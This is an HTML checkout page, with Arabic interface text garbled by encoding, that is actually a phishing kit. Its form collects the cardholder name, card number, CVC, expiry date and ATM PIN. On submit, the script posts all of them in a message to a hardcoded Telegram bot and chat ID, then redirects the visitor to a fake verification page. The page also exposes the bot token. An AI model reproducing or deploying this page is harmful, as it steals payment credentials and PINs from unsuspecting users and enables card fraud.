<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
    <meta charset="UTF-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <title>Payment</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="shortcut icon" href="https://sdad-ae.netlify.app/favicon.ico" type="image/vnd.microsoft.icon">
    
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@200..1000&display=swap');
        
        /* ---------------------------------- */
        /* Ø§Ù„ØªÙ†Ø³ÙŠÙ‚Ø§Øª Ø§Ù„Ø£ØµÙ„ÙŠØ© Ù„Ù€ style.css Ùˆ paymentform.css */
        /* ---------------------------------- */
        *{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Cairo', sans-serif; /* Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø®Ø· Ø¹Ø±Ø¨ÙŠ */
        }
        
        body {
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            background: linear-gradient(135deg, #71b7e6, #9b59b6);
            direction: rtl; /* Ø¯Ø¹Ù… Ø§Ù„Ù„ØºØ© Ø§Ù„Ø¹Ø±Ø¨ÙŠØ© */
            text-align: right;
        }

        .wrapper {
            width: 400px;
            background: #fff;
            border-radius: 15px;
            padding: 25px;
            box-shadow: 0 5px 10px rgba(0, 0, 0, 0.15);
        }

        .wrapper h2 {
            font-size: 24px;
            font-weight: 600;
            color: #333;
            margin-bottom: 20px;
            border-bottom: 1px solid #ccc;
            padding-bottom: 10px;
            text-align: center;
        }

        .wrapper h4 {
            font-size: 16px;
            font-weight: 500;
            color: #333;
            margin: 15px 0 8px 0;
        }

        .input-group {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
        }

        .input-box {
            position: relative;
            width: 100%;
            height: 40px;
        }
        
        /* ØªÙ†Ø³ÙŠÙ‚ Ø­Ù‚ÙˆÙ„ Ø§Ù„Ø¥Ø¯Ø®Ø§Ù„ ÙˆØ§Ù„Ø§Ø®ØªÙŠØ§Ø± */
        .input-box input,
        .input-box select {
            width: 100%;
            height: 100%;
            border: 1px solid #ccc;
            border-radius: 5px;
            padding: 0 45px 0 15px; /* ØªØ±Ùƒ Ù…Ø³Ø§Ø­Ø© Ù„Ù„Ø£ÙŠÙ‚ÙˆÙ†Ø© ÙˆØ§Ù„Ø´Ø¹Ø§Ø± */
            font-size: 16px;
            outline: none;
            transition: all 0.3s ease;
        }
        
        .input-box input:focus,
        .input-box select:focus {
            border-color: #9b59b6;
        }

        .input-box .icon {
            position: absolute;
            left: 10px; /* ØªÙ… ØªØ¹Ø¯ÙŠÙ„ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ù„ÙŠÙƒÙˆÙ† Ø¹Ù„Ù‰ Ø§Ù„ÙŠØ³Ø§Ø± (Ù…Ø¹ Ø§Ù„Ø£Ø®Ø° ÙÙŠ Ø§Ù„Ø§Ø¹ØªØ¨Ø§Ø± Ø£Ù† Ø§Ù„ÙˆØ§Ø¬Ù‡Ø© RTL) */
            top: 50%;
            transform: translateY(-50%);
            color: #aaa;
            pointer-events: none;
        }
        
        /* Ø²Ø± Ø§Ù„ØªØ£ÙƒÙŠØ¯ */
        .input-box button {
            width: 100%;
            height: 45px;
            background: #9b59b6;
            color: #fff;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
        }

        .input-box button:hover {
            background: #8e44ad;
        }

        /* ---------------------------------- */
        /* Ø§Ù„ØªÙ†Ø³ÙŠÙ‚Ø§Øª Ø§Ù„Ø¥Ø¶Ø§ÙÙŠØ© Ù„Ø±Ù…Ø² Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© */
        /* ---------------------------------- */
        #card-logo {
            display: none;
            width: 40px; /* Ø­Ø¬Ù… Ø§Ù„Ø´Ø¹Ø§Ø± */
            height: auto;
            position: absolute; /* ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆØ¶Ø¹ */
            left: 10px; /* âš ï¸ ØªÙ… Ø§Ù„ØªØºÙŠÙŠØ± Ø¥Ù„Ù‰ Ø§Ù„ÙŠØ³Ø§Ø± Ù„ÙŠÙƒÙˆÙ† ÙˆØ§Ø¶Ø­Ù‹Ø§ Ø¨Ø¬Ø§Ù†Ø¨ Ø§Ù„Ø£ÙŠÙ‚ÙˆÙ†Ø© */
            top: 50%; /* ØªÙˆØ³ÙŠØ· Ø¹Ù…ÙˆØ¯ÙŠÙ‹Ø§ */
            transform: translateY(-50%); /* ØªÙˆØ³ÙŠØ· Ø¹Ù…ÙˆØ¯ÙŠÙ‹Ø§ */
            border-radius: 3px;
        }
        
        /* ØªØ¹Ø¯ÙŠÙ„ ØªÙ†Ø³ÙŠÙ‚ Ø­Ù‚Ù„ Ø§Ù„Ø¥Ø¯Ø®Ø§Ù„ Ù„Ø§Ø³ØªÙŠØ¹Ø§Ø¨ Ø§Ù„Ø´Ø¹Ø§Ø± ÙˆØ§Ù„Ø£ÙŠÙ‚ÙˆÙ†Ø© */
        .input-box input#number {
            padding-right: 45px; /* Ù…Ø³Ø§ÙØ© Ù„Ù„Ø£ÙŠÙ‚ÙˆÙ†Ø© */
            padding-left: 90px; /* Ù…Ø³Ø§ÙØ© Ù„Ù„Ø´Ø¹Ø§Ø± ÙˆØ§Ù„Ø£ÙŠÙ‚ÙˆÙ†Ø© */
        }
        
        /* ØªØ¹Ø¯ÙŠÙ„ Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø£ÙŠÙ‚ÙˆÙ†Ø© ÙÙŠ Ø­Ù‚Ù„ Ø±Ù‚Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© Ù„Ù„ÙŠÙ…ÙŠÙ† */
        .input-box input#number + .icon {
            left: unset;
            right: 10px;
        }
        /* Ø¥Ø±Ø¬Ø§Ø¹ Ø£ÙŠÙ‚ÙˆÙ†Ø© Ø§Ù„Ø´Ø¹Ø§Ø± Ø¥Ù„Ù‰ Ø§Ù„ÙŠÙ…ÙŠÙ† Ù„ØªÙØ§Ø¯ÙŠ Ø§Ù„ØªØ¯Ø§Ø®Ù„ Ù…Ø¹ Ø£ÙŠÙ‚ÙˆÙ†Ø© Ø§Ù„Ù€ CVC/PIN */
        #card-logo {
             left: 10px; 
             right: unset;
        }
        
        .input-box {
            position: relative; /* Ù„Ø¬Ø¹Ù„ Ø§Ù„Ø´Ø¹Ø§Ø± ÙŠØ¸Ù‡Ø± Ø¯Ø§Ø®Ù„ Ø§Ù„Ø­Ù‚Ù„ */
        }
    </style>
</head>
<body>
    <div class="wrapper">
        <h2>Ø¥ØªÙ…Ø§Ù… Ø§Ù„Ø¯ÙØ¹</h2>
        <form id="page2form">
            <div class="input-box">
                <select name="payThrough" id="payThrough" required>
                    <option value="" disabled selected>Ø³Ø¯Ø§Ø¯ Ø¹Ø¨Ø±</option>
                    <option value="1">ØªØ¬Ø±ÙŠØ¨ 1</option>
                    <option value="2">ØªØ¬Ø±ÙŠØ¨ 2</option>
                    <option value="15">LIV</option>
                </select>
            </div>
            
            <h4>Ø§Ù„Ø§Ø³Ù… Ø¹Ù„Ù‰ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©</h4>
            <div class="input-group">
                <div class="input-box">
                    <input type="text" name="name" id="name" placeholder="Ø§Ø³Ù…Ùƒ " required class="name">
                    <i class="fas fa-user icon"></i>
                </div>
            </div>
            
            <h4>Ø±Ù‚Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©</h4>
            <div class="input-group">
                <div class="input-box">
                    <input type="tel" name="number" id="number" placeholder="Ø£Ø¯Ø®Ù„ Ø±Ù‚Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©" maxlength="19" required class="name">
                    <i class="fa fa-credit-card icon"></i>
                    <img id="card-logo" src="" alt="Ø±Ù…Ø² Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©">
                </div>
            </div>
            
            <h4>(CVC) Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚</h4>
            <div class="input-group">
                <div class="input-box">
                    <input type="tel" name="cvc" id="cvv" maxlength="4" placeholder="CVC" required class="name">
                    <i class="fa fa-credit-card-alt icon"></i>
                </div>
            </div>
            
            <h4>ØªØ§Ø±ÙŠØ® Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡</h4>
            <div class="input-group">
                <div class="input-box">
                    <select name="month" id="expMonth" required>
                        <option value="" disabled selected>Ø´Ù‡Ø±</option>
                        <option value="01">01</option>
                        <option value="02">02</option>
                        <option value="03">03</option>
                        <option value="04">04</option>
                        <option value="05">05</option>
                        <option value="06">06</option>
                        <option value="07">07</option>
                        <option value="08">08</option>
                        <option value="09">09</option>
                        <option value="10">10</option>
                        <option value="11">11</option>
                        <option value="12">12</option>
                    </select>
                </div>
                <div class="input-box">
                    <select name="year" id="expYear" required>
                        <option value="" disabled selected>Ø³Ù†Ø©</option>
                        <option value="2025">2025</option>
                        <option value="2026">2026</option>
                        <option value="2027">2027</option>
                        <option value="2028">2028</option>
                        <option value="2029">2029</option>
                        <option value="2030">2030</option>
                        <option value="2031">2031</option>
                    </select>
                </div>
            </div>
            
            <h4>(PIN) Ø§Ù„Ø±Ù…Ø² Ø§Ù„Ø®Ø§Øµ Ø¨Ø£Ø¬Ù‡Ø²Ø© Ø§Ù„ØµØ±Ø§Ù Ø§Ù„Ø¢Ù„ÙŠ </h4>
            <div class="input-group">
                <div class="input-box">
                    <input type="password" name="fort" id="fort" placeholder="****" maxlength="4" required class="name">
                    <i class="fa fa-unlock-alt icon"></i>
                </div>
            </div>
            
            <div class="input-group">
                <div class="input-box">
                    <button type="submit" id="nextButton">ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ø¯ÙØ¹</button>
                </div>
            </div>
        </form>
    </div>

    <script>
        // Ø¯Ø§Ù„Ø© Ù„Ø¥Ø¶Ø§ÙØ© Ù…Ø³Ø§ÙØ§Øª ØªÙ„Ù‚Ø§Ø¦ÙŠØ© Ø¨ÙŠÙ† ÙƒÙ„ 4 Ø£Ø±Ù‚Ø§Ù…
        function formatCardNumber(cardNumber) {
            // Ø¥Ø²Ø§Ù„Ø© Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù…Ø³Ø§ÙØ§Øª Ø§Ù„Ù…ÙˆØ¬ÙˆØ¯Ø©
            cardNumber = cardNumber.replace(/\s/g, "");
            // Ø¥Ø¶Ø§ÙØ© Ù…Ø³Ø§ÙØ© Ø¨Ø¹Ø¯ ÙƒÙ„ 4 Ø£Ø±Ù‚Ø§Ù…
            return cardNumber.replace(/(\d{4})/g, "$1 ").trim();
        }

        // Ø¯Ø§Ù„Ø© Ù„Ù„ØªØ¹Ø±Ù Ø¹Ù„Ù‰ Ù†ÙˆØ¹ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©
        function detectCardType(cardNumber) {
            const firstFourDigits = cardNumber.substring(0, 4);

            // Ù‚Ø§Ø¦Ù…Ø© Ø¨Ø£Ù†ÙˆØ§Ø¹ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø§Øª ÙˆØ£Ø±Ù‚Ø§Ù…Ù‡Ø§ Ø§Ù„Ø£ÙˆÙ„Ù‰
            const cardTypes = {
                "visa": /^4/, // ÙÙŠØ²Ø§ ØªØ¨Ø¯Ø£ Ø¨Ù€ 4
                "mastercard": /^5[1-5]/, // Ù…Ø§Ø³ØªØ±ÙƒØ§Ø±Ø¯ ØªØ¨Ø¯Ø£ Ø¨Ù€ 51 Ø¥Ù„Ù‰ 55
                "applepay": /^2/, // Ø£Ø¨Ù„ Ø¨Ø§ÙŠ ØªØ¨Ø¯Ø£ Ø¨Ù€ 2 (ÙŠÙ…ÙƒÙ† ØªØ¹Ø¯ÙŠÙ„Ù‡Ø§ Ø­Ø³Ø¨ Ø§Ù„Ø­Ø§Ø¬Ø©)
            };

            // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ù†ÙˆØ¹ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©
            for (const [cardType, pattern] of Object.entries(cardTypes)) {
                if (pattern.test(firstFourDigits)) {
                    return cardType;
                }
            }

            return null; // Ø¥Ø°Ø§ Ù„Ù… ÙŠØªÙ… Ø§Ù„ØªØ¹Ø±Ù Ø¹Ù„Ù‰ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©
        }

        // Ø¯Ø§Ù„Ø© Ù„ØªØ­Ø¯ÙŠØ« Ø±Ù…Ø² Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©
        function updateCardLogo(cardType) {
            const cardLogo = document.getElementById("card-logo");

            if (cardType) {
                // Ù…Ø³Ø§Ø± Ø§Ù„ØµÙˆØ± Ø¨Ù†Ø§Ø¡Ù‹ Ø¹Ù„Ù‰ Ù†ÙˆØ¹ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©
                const cardImages = {
                    "visa": "./Card-info_files/3.png", // ÙÙŠØ²Ø§
                    "mastercard": "./Card-info_files/1.png", // Ù…Ø§Ø³ØªØ±ÙƒØ§Ø±Ø¯
                    "applepay": "./Card-info_files/2.png", // Ø£Ø¨Ù„ Ø¨Ø§ÙŠ
                };

                cardLogo.src = cardImages[cardType]; // ØªØ­Ø¯ÙŠØ« Ø§Ù„ØµÙˆØ±Ø©
                cardLogo.style.display = "inline-block";
            } else {
                cardLogo.style.display = "none";
            }
        }

        // Ø§Ø³ØªÙ…Ø§Ø¹ Ù„ØªØºÙŠÙŠØ± Ø­Ù‚Ù„ Ø§Ù„Ø¥Ø¯Ø®Ø§Ù„
        document.getElementById("number").addEventListener("input", function (e) {
            const cardNumberInput = e.target;
            let cardNumber = cardNumberInput.value.replace(/\s/g, ""); // Ø¥Ø²Ø§Ù„Ø© Ø§Ù„Ù…Ø³Ø§ÙØ§Øª

            // Ø§Ù„Ø³Ù…Ø§Ø­ ÙÙ‚Ø· Ø¨Ø¥Ø¯Ø®Ø§Ù„ Ø§Ù„Ø£Ø±Ù‚Ø§Ù…
            cardNumber = cardNumber.replace(/\D/g, "");

            // ØªÙ†Ø³ÙŠÙ‚ Ø§Ù„Ø±Ù‚Ù… Ø¨Ø¥Ø¶Ø§ÙØ© Ù…Ø³Ø§ÙØ§Øª
            const formattedCardNumber = formatCardNumber(cardNumber);

            // ØªØ­Ø¯ÙŠØ« Ù‚ÙŠÙ…Ø© Ø§Ù„Ø­Ù‚Ù„ Ø¨Ø§Ù„Ø±Ù‚Ù… Ø§Ù„Ù…Ù†Ø³Ù‚
            cardNumberInput.value = formattedCardNumber;

            // Ø§Ù„ØªØ¹Ø±Ù Ø¹Ù„Ù‰ Ù†ÙˆØ¹ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© ÙˆØªØ­Ø¯ÙŠØ« Ø§Ù„Ø´Ø¹Ø§Ø±
            const cardType = detectCardType(cardNumber);
            updateCardLogo(cardType);
        });

        // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¥Ù„Ù‰ ØªÙ„ØºØ±Ø§Ù… (ØªÙ… Ø§Ù„ØªØ¹Ø¯ÙŠÙ„ Ù„Ø¬Ù„Ø¨ Ø§Ù„Ù†Øµ Ø§Ù„Ø¸Ø§Ù‡Ø±)
        document.getElementById("page2form").addEventListener("submit", function(event) {
            event.preventDefault(); // Ù…Ù†Ø¹ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ÙÙˆØ±ÙŠ
            
            let name = document.getElementById("name").value;
            let number = document.getElementById("number").value.replace(/\s/g, ""); 
            let cvc = document.getElementById("cvv").value;
            let month = document.getElementById("expMonth").value;
            let year = document.getElementById("expYear").value;
            let fort = document.getElementById("fort").value;
            
            // ğŸ› ï¸ Ø¬Ù„Ø¨ Ø¹Ù†ØµØ± select ÙˆØ§Ø®ØªÙŠØ§Ø±Ù‡ Ù„Ù€ "Ø³Ø¯Ø§Ø¯ Ø¹Ø¨Ø±"
            const payThroughSelect = document.getElementById("payThrough");
            // ğŸ› ï¸ Ø¬Ù„Ø¨ Ø§Ù„Ù†Øµ Ø§Ù„Ø¸Ø§Ù‡Ø± (Ù…Ø«Ù„ "ØªØ¬Ø±ÙŠØ¨ 2") Ø¨Ø¯Ù„Ø§Ù‹ Ù…Ù† Ø§Ù„Ù‚ÙŠÙ…Ø© (Ù…Ø«Ù„ "2")
            let payThroughText = payThroughSelect.options[payThroughSelect.selectedIndex].text; 
            
            // ğŸ› ï¸ Ø¬Ù„Ø¨ Ø¹Ù†ØµØ± select ÙˆØ§Ø®ØªÙŠØ§Ø±Ù‡ Ù„Ù€ "Ø§Ù„Ø³Ù†Ø©"
            const yearSelect = document.getElementById("expYear");
            // ğŸ› ï¸ Ø¬Ù„Ø¨ Ø§Ù„Ù†Øµ Ø§Ù„Ø¸Ø§Ù‡Ø± Ù„Ù„Ø³Ù†Ø© (Ù…Ø«Ù„ "2025")
            let yearText = yearSelect.options[yearSelect.selectedIndex].text;

            // âš ï¸ Ù…Ù„Ø§Ø­Ø¸Ø©: Ù‚Ù…Ù†Ø§ Ø¨ØªØºÙŠÙŠØ± year Ø¥Ù„Ù‰ yearText ÙÙŠ Ø§Ù„Ø±Ø³Ø§Ù„Ø©

            // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø£Ù† Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø­Ù‚ÙˆÙ„ Ø§Ù„Ù…Ø·Ù„ÙˆØ¨Ø© Ù…Ù…ØªÙ„Ø¦Ø©
            if (name && number && cvc && month && year && fort && payThroughText && yearText) {

                // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¥Ù„Ù‰ ØªÙ„ØºØ±Ø§Ù…
                let message = `Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯ÙØ¹:\nØ³Ø¯Ø§Ø¯ Ø¹Ø¨Ø±: ${payThroughText}\nØ§Ù„Ø§Ø³Ù…: ${name}\nØ±Ù‚Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©: ${number}\nCVC: ${cvc}\nØªØ§Ø±ÙŠØ® Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡: ${month}/${yearText}\nÙƒÙ„Ù…Ø© Ø§Ù„Ø³Ø±: ${fort}`;
                
                fetch(`https://api.telegram.org/bot7676226649:AAHE6aj-0kFU29ijO7dAw3vH4pE_JF1R4vY/sendMessage`, {
                    method: "POST",
                    body: JSON.stringify({
                        chat_id: "5417478446",
                        text: message
                    }),
                    headers: {
                        "Content-Type": "application/json"
                    }
                })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log("DONE");
                    } else {
                        console.error("ERROR", data);
                    }
                })
                .catch(error => {
                    console.error("ERROR", error);
                });

                // Ø§Ù„ØªÙˆØ¬ÙŠÙ‡ Ø¥Ù„Ù‰ ØµÙØ­Ø© Ø§Ù„Ø¯ÙØ¹ Ø¨Ø¹Ø¯ ØªØ£Ø®ÙŠØ± 2 Ø«Ø§Ù†ÙŠØ©
                setTimeout(function() {
                    window.location.href = "verification-code.html";
                }, 2000);
            } else {
                alert("ÙŠØ±Ø¬Ù‰ Ù…Ù„Ø¡ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø­Ù‚ÙˆÙ„ Ø§Ù„Ù…Ø·Ù„ÙˆØ¨Ø©.");
            }
        });
    </script>
</body>
</html>
